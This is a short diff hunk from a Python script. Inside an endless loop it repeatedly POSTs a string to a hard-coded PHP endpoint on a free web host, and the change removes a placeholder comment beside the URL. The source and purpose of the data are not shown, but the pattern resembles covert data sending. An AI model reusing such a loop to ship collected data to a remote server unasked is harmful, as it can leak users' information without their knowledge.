@@ -24,6 +24,6 @@ while True :
         
     myobj = {'x': str1}
 
-    url = "http://martinserver3.000webhostapp.com/active/active.php" #ADD SERVER URL HERE
+    url = "http://martinserver3.000webhostapp.com/active/active.php"
 
     requests.post(url, data = myobj).text
